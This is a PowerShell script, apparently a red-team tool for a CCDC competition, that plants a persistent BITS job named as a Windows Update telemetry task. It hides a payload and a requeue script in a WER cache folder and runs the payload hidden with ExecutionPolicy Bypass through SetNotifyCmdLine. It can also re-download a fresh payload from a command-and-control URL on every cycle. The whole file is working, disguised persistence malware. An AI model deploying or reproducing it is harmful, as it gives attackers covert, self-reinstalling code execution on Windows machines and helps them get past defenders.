#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC_Windows_BITS_BitsAndPieces.ps1
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
#  Plants a persistent Background Intelligent Transfer Service (BITS) job
#  disguised as a Windows Update telemetry task.
#
#  WHY BITS:
#    - BITS jobs survive reboots - visible only via bitsadmin /List
#    - Does NOT appear in Get-ScheduledTask, Get-Service, or Task Manager
#    - SetNotifyCmdLine fires your payload on job completion automatically
#    - With a CallbackUrl: re-downloads a fresh payload from C2 on every
#      trigger cycle and re-queues itself (payload survives deletion)
#    - Without a CallbackUrl: uses a local UNC self-reference so the job
#      loops via localhost - no external server required
#
#  Usage:
#    .\CCDC_Windows_BITS_BitsAndPieces.ps1 -PayloadPath C:\beacon.exe
#    .\CCDC_Windows_BITS_BitsAndPieces.ps1 -PayloadPath C:\beacon.exe `
#        -CallbackUrl http://10.10.10.1:8080/beacon.exe
#
#  Payload: .exe or .ps1
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,

    [Parameter(Mandatory=$false)]
    [string]$CallbackUrl = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }

Write-Host ""
Write-Warn  "================================================================"
Write-Warn  " CCDC Windows BITS Persistence - BitsAndPieces.ps1"
Write-Warn  "================================================================"
Write-Host "  Job name  : WU_Telemetry_BacklogProcessor" -ForegroundColor Yellow
Write-Host "  Mechanism : BITS SetNotifyCmdLine re-queue loop" -ForegroundColor Yellow
Write-Host "  Hidden in : Get-ScheduledTask / Get-Service do NOT show BITS jobs" -ForegroundColor Yellow
Write-Host ""

# =============================================================================
# Validate payload
# =============================================================================
if (-not (Test-Path $PayloadPath)) {
    Write-Err "Payload not found: $PayloadPath"
    exit 1
}

$IsExe = $PayloadPath -match '\.exe$'
$PayloadExt = if ($IsExe) { '.exe' } else { '.ps1' }
Write-Info "Payload: $PayloadPath  ($(if ($IsExe) { 'EXE mode' } else { 'PS1 mode' }))"
if ($CallbackUrl) { Write-Info "Callback URL: $CallbackUrl" }
else              { Write-Warn "No CallbackUrl supplied - using local UNC self-reference loop" }
Write-Host ""

# =============================================================================
# Hidden drop directory (same as ClusterShells)
# =============================================================================
$DropDir = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
if (-not (Test-Path $DropDir)) {
    New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
}
$dirObj = Get-Item $DropDir -Force
$dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden

# Local payload copy - the one that will always be executed
$LocalDrop  = "$DropDir\wutelemetry-cache$PayloadExt"
Copy-Item -Path $PayloadPath -Destination $LocalDrop -Force
$f1 = Get-Item $LocalDrop -Force
$f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
Write-Success "Payload copied to: $LocalDrop (hidden)"

# BITS download destination (what BITS writes to on each cycle)
$BitsDest = "$DropDir\wutelemetry-stage$PayloadExt"

# =============================================================================
# Build the requeue notify script
# Fires via SetNotifyCmdLine on BG_NOTIFY_JOB_TRANSFERRED (1) and
# BG_NOTIFY_JOB_ERROR (2). Re-creates the BITS job after each completion.
# =============================================================================
$NotifyScript = "$DropDir\wutelemetry-notify.ps1"

# Determine BITS source (remote URL or local UNC loop)
if ($CallbackUrl) {
    $BitsSource = $CallbackUrl
    # After notify: execute the fresh download, then re-queue from the same URL
    $notifyLines = [System.Collections.Generic.List[string]]::new()
    if ($IsExe) {
        $notifyLines.Add("Start-Process -FilePath '$BitsDest' -WindowStyle Hidden -ErrorAction SilentlyContinue")
    } else {
        $notifyLines.Add("Start-Process -FilePath 'powershell.exe' -ArgumentList '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$BitsDest""' -WindowStyle Hidden -ErrorAction SilentlyContinue")
    }
    $notifyLines.Add("Start-Sleep -Seconds 5")
    $notifyLines.Add('$jOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1')
    $notifyLines.Add('$jGuid = ($jOut | Select-String -Pattern ''\{[0-9A-Fa-f-]+\}'').Matches.Value')
    $notifyLines.Add('if ($jGuid) {')
    $notifyLines.Add("    bitsadmin /AddFile `$jGuid '$CallbackUrl' '$BitsDest' | Out-Null")
    $notifyLines.Add('    bitsadmin /SetPriority $jGuid FOREGROUND | Out-Null')
    $notifyLines.Add('    bitsadmin /SetMinRetryDelay $jGuid 900 | Out-Null')
    $notifyLines.Add('    bitsadmin /SetNoProgressTimeout $jGuid 7776000 | Out-Null')
    $notifyLines.Add('    bitsadmin /SetNotifyFlags $jGuid 3 | Out-Null')
    $notifyLines.Add("    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript""' | Out-Null")
    $notifyLines.Add('    bitsadmin /Resume $jGuid | Out-Null')
    $notifyLines.Add('}')
} else {
    # Local UNC self-reference: download from \\127.0.0.1\C$\...\local_copy to a stage file
    # SYSTEM has access to admin shares on localhost; this completes instantly each cycle
    $LocalUNC = $LocalDrop -replace '^C:\\', '\\127.0.0.1\C$\'
    $BitsSource = $LocalUNC

    $notifyLines = [System.Collections.Generic.List[string]]::new()
    if ($IsExe) {
        $notifyLines.Add("Start-Process -FilePath '$LocalDrop' -WindowStyle Hidden -ErrorAction SilentlyContinue")
    } else {
        $notifyLines.Add("Start-Process -FilePath 'powershell.exe' -ArgumentList '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$LocalDrop""' -WindowStyle Hidden -ErrorAction SilentlyContinue")
    }
    $notifyLines.Add("Start-Sleep -Seconds 3")
    $notifyLines.Add("Remove-Item -Path '$BitsDest' -Force -ErrorAction SilentlyContinue")
    $notifyLines.Add('$jOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1')
    $notifyLines.Add('$jGuid = ($jOut | Select-String -Pattern ''\{[0-9A-Fa-f-]+\}'').Matches.Value')
    $notifyLines.Add('if ($jGuid) {')
    $notifyLines.Add("    bitsadmin /AddFile `$jGuid '$LocalUNC' '$BitsDest' | Out-Null")
    $notifyLines.Add('    bitsadmin /SetPriority $jGuid FOREGROUND | Out-Null')
    $notifyLines.Add('    bitsadmin /SetMinRetryDelay $jGuid 900 | Out-Null')
    $notifyLines.Add('    bitsadmin /SetNoProgressTimeout $jGuid 7776000 | Out-Null')
    $notifyLines.Add('    bitsadmin /SetNotifyFlags $jGuid 3 | Out-Null')
    $notifyLines.Add("    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript""' | Out-Null")
    $notifyLines.Add('    bitsadmin /Resume $jGuid | Out-Null')
    $notifyLines.Add('}')
}

$NotifyContent = $notifyLines -join [System.Environment]::NewLine
Set-Content -Path $NotifyScript -Value $NotifyContent -Encoding UTF8 -Force
$fNotify = Get-Item $NotifyScript -Force
$fNotify.Attributes = $fNotify.Attributes -bor [System.IO.FileAttributes]::Hidden
Write-Success "Notify/requeue script: $NotifyScript (hidden)"

# =============================================================================
# Cancel any existing BITS jobs with our display name
# =============================================================================
Write-Info "Clearing any existing WU_Telemetry_BacklogProcessor jobs..."
try {
    $listOut = bitsadmin /List /AllUsers 2>&1 | Out-String
    $allGuids = [regex]::Matches($listOut, '\{[0-9A-Fa-f-]+\}') | Select-Object -ExpandProperty Value
    foreach ($g in $allGuids) {
        $info = bitsadmin /Info $g /Verbose 2>&1 | Out-String
        if ($info -match 'WU_Telemetry_BacklogProcessor') {
            bitsadmin /Cancel $g 2>&1 | Out-Null
            Write-Info "  Cancelled existing job: $g"
        }
    }
} catch {
    Write-Warn "  Could not enumerate existing BITS jobs: $_"
}

# =============================================================================
# Create the BITS job
# =============================================================================
Write-Info "Creating BITS job: WU_Telemetry_BacklogProcessor ..."

$createOut = bitsadmin /Create "WU_Telemetry_BacklogProcessor" 2>&1 | Out-String
$jobGuid = ([regex]::Match($createOut, '\{[0-9A-Fa-f-]+\}')).Value

if (-not $jobGuid) {
    Write-Err "Failed to create BITS job. bitsadmin output: $createOut"
    exit 1
}
Write-Success "  Job GUID: $jobGuid"

# Add the file transfer
bitsadmin /AddFile $jobGuid "$BitsSource" "$BitsDest" 2>&1 | Out-Null
Write-Success "  Source : $BitsSource"
Write-Success "  Dest   : $BitsDest"

# Configure job behavior
bitsadmin /SetPriority         $jobGuid FOREGROUND        2>&1 | Out-Null
bitsadmin /SetMinRetryDelay    $jobGuid 900               2>&1 | Out-Null  # 15 min retry
bitsadmin /SetNoProgressTimeout $jobGuid 7776000          2>&1 | Out-Null  # 90 day max
bitsadmin /SetDescription      $jobGuid "Windows Update telemetry backlog processor - do not cancel" 2>&1 | Out-Null

# Set notification: fire on success (1) AND permanent error (2)
bitsadmin /SetNotifyFlags $jobGuid 3 2>&1 | Out-Null

# Notify callback: run the requeue PS1 as SYSTEM via powershell.exe
$notifyArg = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$NotifyScript"""
bitsadmin /SetNotifyCmdLine $jobGuid "powershell.exe" "$notifyArg" 2>&1 | Out-Null
Write-Success "  NotifyCmdLine set -> $NotifyScript"

# Start the job
bitsadmin /Resume $jobGuid 2>&1 | Out-Null
Write-Success "  Job resumed - status: $(bitsadmin /GetState $jobGuid 2>&1 | Select-String -Pattern '(TRANSFERRING|QUEUED|TRANSIENT_ERROR|ERROR)' | Select-Object -First 1)"

# =============================================================================
# Execute the local payload immediately (first run)
# =============================================================================
Write-Info "Executing local payload immediately ..."
if ($IsExe) {
    Start-Process -FilePath $LocalDrop -WindowStyle Hidden
} else {
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LocalDrop`"" `
        -WindowStyle Hidden
}
Write-Success "  Payload launched."

# =============================================================================
# Summary
# =============================================================================
Write-Host ""
Write-Warn  "================================================================"
Write-Warn  " BITS PERSISTENCE PLANTED"
Write-Warn  "================================================================"
Write-Host ""
Write-Host "  Job name    : WU_Telemetry_BacklogProcessor" -ForegroundColor Red
Write-Host "  Job GUID    : $jobGuid" -ForegroundColor Red
Write-Host "  Source      : $BitsSource" -ForegroundColor Red
Write-Host "  Local drop  : $LocalDrop (hidden)" -ForegroundColor Red
Write-Host "  Notify      : $NotifyScript (hidden, re-queues on each fire)" -ForegroundColor Red
Write-Host ""
Write-Host "  Blue team check: bitsadmin /List /AllUsers /Verbose" -ForegroundColor Yellow
Write-Host "  Payload fires  : on job completion (or error) via SetNotifyCmdLine" -ForegroundColor Yellow
Write-Host ""
